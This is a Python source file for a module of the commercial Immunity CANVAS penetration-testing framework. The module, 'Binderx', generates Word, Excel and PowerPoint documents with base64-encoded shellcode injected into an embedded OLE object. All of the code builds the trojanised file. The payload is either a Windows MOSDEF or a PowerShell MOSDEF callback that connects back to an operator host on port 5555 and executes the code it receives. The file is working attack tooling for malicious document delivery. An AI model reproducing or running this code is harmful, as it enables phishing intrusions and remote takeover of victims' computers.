#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
from shellcode import shellcodeGenerator, win32shell
import pelib
import zipfile

import os,struct, base64
import canvasengine
import logging
from Nodes.mosdef_powershell.mosdef_powershell import *


NAME                            = "Binderx Module"
DESCRIPTION                     = "Allows the injection and execution of a payload inside an Office file"
DOCUMENTATION                   = {}
DOCUMENTATION['Vendor']         = "Microsoft"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["Date public"]    = "19/05/2016"


VERSION                         = "2.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = [ "7", "8", "8.1", "10" ]

NOTES = """
This module creates a blank Office file (MS Word or MS Excel) with a payload inside (WinMosdef or PowershellMosdef). The user has the option to create a legacy file (old Office format: doc or xls extensions) or create an OpenXML format (docm or xlsm) like in newer Office versions (>2010).
In new versions of Office a Macro-Enable document can't be saved as a regular document (docx or xlsx), instead it must be saved as docm or xlsm.
MS Powerpoint files are not supported due MS PowerPoint not including any automatic macro support (available in Excel & Word). The only ones available are Auto_Open & Auto_Close macros. However these fire automatically provided they are within an add-in.

Notes for version 2.0:
Adding support for MS PowerPoint files. This new feature uses a VBScript to launch the shellcode (WinMOSDEF or PowershellMOSDEF) using an OLE object custom action to execute it. The module creates a blank pptx file or a ppsx depending on the extension passed in the filename. Users can create a pptx file and add something on it and then create the ppsx or directly create a blank ppsx file. 

Tested on:

- Microsoft Office 2007 (x32) on Windows 7 Ultimate N, EN (x32)
- Microsoft Office 2010 SP2 (x32) on Windows 7 Ultimate N, EN (x32)
- Microsoft Office 2013 SP1 (x32) on Windows 7 Ultimate N, EN (x32)
- Microsoft Office 2013 SP1 (x32) on Windows 8.1 EN (x32)
- Microsoft Office 2016 Proffesional Plus (x32) on Windows 8.1 EN (x32)
"""

DOCUMENTATION["Notes"] = NOTES


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setVersions()
        self.clientversion   = None
        self.name            = NAME
        self.filename        = None
        self.exefile         = None
        self.callback_option = None
        self.pscb            = False
        self.legacy          = False
        self.file_ext        = None


    def getargs(self):
        self.filename        = self.argsDict.get("filename", self.filename)
        self.legacy          = self.argsDict.get("legacy", self.legacy)
        self.clientversion   = self.argsDict.get("clientversion_radiobutton_value", self.clientversion)
        if not self.clientversion:
            logging.warning("client version not found, using version %s" % str(self.versions[1][0]))
            self.clientversion=1
        else:
            logging.info("Client version: %s" % self.clientversion)
            if "Word" in self.clientversion:
                self.clientversion = 1
                self.file_ext = "docm"
            elif "Excel" in self.clientversion:
                self.clientversion = 2
                self.file_ext = "xlsm"
            elif "Powerpoint" in self.clientversion:
                self.clientversion = 3
                #check for filename extension
                if self.filename and self.filename.endswith(".pptx"):
                    self.file_ext = "pptx"
                else:
                    self.file_ext = "ppsx"
            else:
                self.clientversion = 1
                self.file_ext = "docm"
        self.clientversion = int(self.clientversion)

        self.callback_option = self.argsDict.get("cb_radiobutton_value", self.callback_option)
        if "PowerShell" in self.callback_option:
            self.pscb = True
        else:
            self.pscb = False

        logging.info("Callback option: %s" % self.callback_option)

        if not self.checkFileExtension():
            logging.info("Filename extension was changed to: <%s>" % self.filename)

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def setVersions(self):
        self.versions = {}
        #name
        self.versions[1] = ("MS Word file", None)
        self.versions[2] = ("MS Excel file", None)
        self.versions[3] = ("MS Powerpoint file", None)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getWinShellcode(self):
        trojan = ''
        try:
            sc = shellcodeGenerator.win32()
            sc.addAttr('findeipnoesp', {'subespval': 0})
            sc.addAttr('revert_to_self_before_importing_ws2_32', {"win8_compatible":True})
            sc.addAttr('tcpconnect', {'port' : self.callback.port,
                                      'ipaddress' : self.callback.ip})

            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
            sc.addAttr("ExitThread",None)
            sc.vAllocSelf = True #we need to move to another page!

            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(sc.get())

        except:
            import traceback
            traceback.print_exc(file=sys.stderr)

        self.shellcode = trojan
        return self.shellcode

    def getPSShellcode(self):
        ps_mosdef = mosdef_powershell(self)
        return ps_mosdef.createMosdefCallback()

    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))
        logging.info("Opening %s for output" % self.filename)
        filedata = self.makefile()
        if filedata:
            logging.info("Output file: %s" % self.filename)
            self.setInfo("%s - done" % (NAME))
            return 1
        else:
            logging.error("Something went wrong....")
            self.setInfo("%s - failed" % (NAME))
        return 0

    def makefile(self):
        shellcode = self.getShellcode()

        self.setProgress(30)
        ole_path  = ""
        local_res = os.path.join(os.path.dirname(__file__), 'Resources')
        logging.info("Using version %s" % self.clientversion)
        if   self.clientversion == 1:
            #doc file
            ole_path = "word"
            template_file = os.path.join(local_res,"template.doc" if self.legacy else "template.docm")
            if not self.filename: self.filename = "binderx.doc" if self.legacy else "binderx.docm"
        elif self.clientversion == 2:
            #xls file
            ole_path = "xl"
            template_file = os.path.join(local_res,"template.xls" if self.legacy else "template.xlsm")
            if not self.filename: self.filename = "binderx.xls" if self.legacy else "binderx.xlsm"
        elif self.clientversion == 3:
            #ppt file
            ole_path = "ppt"
            #template_file = os.path.join(local_res,"template.ppt" if self.legacy else "template.ppsx")
            #if not self.filename: self.filename = "binderx.ppt" if self.legacy else "binderx.ppsx"
            if self.legacy: 
                logging.error("Not support for legacy PPT files yet")
                return None
            template_file = os.path.join(local_res,"template.ppsx" if  self.file_ext == "ppsx" else
            "template.pptx")
            if not self.filename: self.filename = "binderx.ppsx"
        else:
            return None

        b64shellcode = base64.standard_b64encode(shellcode)
        self.setProgress(50)

        if self.legacy:
            filedata = self.createlegacyfile(template_file,b64shellcode)
            fd = file(self.filename,"wb+")
            fd.write(filedata)
            fd.close()
            return filedata

        ztemplate = zipfile.ZipFile(template_file)

        # Get the OLE2 file and insert the shellcode
        full_ole_path = ole_path + "/embeddings/oleObject1.bin"
        fi_ole        = ztemplate.open(full_ole_path, 'r')
        buff          = ""
        for line in fi_ole:
                if "BEGINBEGIN" in line:
                   bufflen = 62000
                   if self.pscb:
                      line = line.replace('XxXxX',chr(0)*2 + "PS" + chr(0))
                   else:
                      line = line.replace('XxXxX',chr(0)*5)
                   if bufflen > len(b64shellcode):
                      diff = bufflen - len(b64shellcode)
                      shell= b64shellcode + '\0'*diff
                      line = line.replace('A'*bufflen,shell)
                if ole_path == "ppt":
                    if 'X'*35000 in line:
                        bufflen = 35000
                        if bufflen > len(b64shellcode):
                            diff  = bufflen - len(b64shellcode)
                            shell = b64shellcode + '"'+ chr(39) + 'A'*(diff-2)
                            line = line.replace('X'*bufflen,shell)
                    if self.pscb and "ps=PSF" in line:
                        line = line.replace("'Dim ps: ps=PSF","Dim ps: ps=True")
                
                buff = buff + line

        object1 = buff

        # Make the Office file with the template
        zout = zipfile.ZipFile(self.filename, "w")

        # This object will contain our trojan.
        zip_object1 = zipfile.ZipInfo()
        zip_object1.filename = full_ole_path
        zip_object1.compress_type = zipfile.ZIP_DEFLATED

        zout.writestr(zip_object1, object1)

        # transfer the rest of the original files
        #for f in ztemplate.namelist():
        #    if not f.endswith('oleObject1.bin'):
        #       zout.writestr(f, ztemplate.read(f))
        for zobj in ztemplate.infolist():
            if not zobj.filename.endswith('oleObject1.bin'):
               zout.writestr(zobj, ztemplate.read(zobj.filename))

        ztemplate.close()
        zout.close()

        fo = file(self.filename,"rb")
        filedata = fo.read()
        fo.close()
        return filedata

    def getShellcode(self):
        self.callback.ip = self.engine.get_callback_interface().ip
        self.callback.port = 5555
        if self.pscb:
            shell = self.getPSShellcode()
        else:
            shell = self.getWinShellcode()

        return shell

    def createlegacyfile(self, template_file, b64shellcode):
        fd = open(template_file, "rb")
        oridata = fd.read()

        block_size=995
        len_shell = len(b64shellcode)
        blocks = len_shell/block_size
        if len_shell % block_size:
           blocks += 1

        if blocks > 70:
           logging.error("Shellcode can't fit inside the file")
           exit

        #separate b64shellcode in chunks
        x = b64shellcode
        chunks, chunk_size = len_shell , block_size
        sl = [ x[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]

        pattern = "#0BEGINBEGINXxXxX00"
        counter = 1
        newdata = ""

        while counter <= blocks:
              strcounter = str(counter).zfill(2)
              newpattern = pattern + strcounter + "00"

              if newpattern in oridata:
                 fd.seek(oridata.find(newpattern))
                 oriline = fd.read(1026)
                 line    = oriline
                 newline = line.replace(newpattern, chr(0) * 2 + "BEGINBEGIN" + chr(0) * 7 + strcounter + chr(0) * 2)
                 newline = newline.replace("000", chr(0) * 3)
                 #inject shellcode
                 len_chunk = len(sl[counter-1])
                 if len_chunk != block_size:
                    diff = block_size - len_chunk
                    newchunk= sl[counter-1] + chr(0) * diff
                    newline = newline.replace("X" * block_size, newchunk)
                 else:
                    newline = newline.replace("X" * block_size, sl[counter-1])

                 newdata = oridata.replace(line, newline)
                 oridata = newdata

              counter += 1
        #add blocks qty
        blockspattern = "#0BLOCKSBLOCKSXxX000000FLAG"
        if blockspattern in newdata:
           tail = chr(0) * 2
           if self.pscb:
              tail+= "PS" + chr(0) * 2
           else:
              tail+= chr(0) * 4
           newdata = newdata.replace(blockspattern, chr(0) * 2 + "BLOCKSBLOCKS" + chr(0) * 5 + str(blocks).zfill(2) + tail)

        fd.close()
        return newdata

    def checkFileExtension(self):
        status = False
        if self.filename:
            if "." in self.filename:
                #check for the correct extension
                if self.filename.endswith(self.file_ext) and not self.legacy:
                    status=True
                elif self.filename.endswith(self.file_ext[:-1]) and self.legacy:
                    status=True
                else:
                    self.filename = self.filename[0:self.filename.find(".")+1] + (self.file_ext[:-1] if self.legacy else self.file_ext)
            else:
                #add the correct extension
                self.filename = self.filename + "." + (self.file_ext[:-1] if self.legacy else self.file_ext)

        return status


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
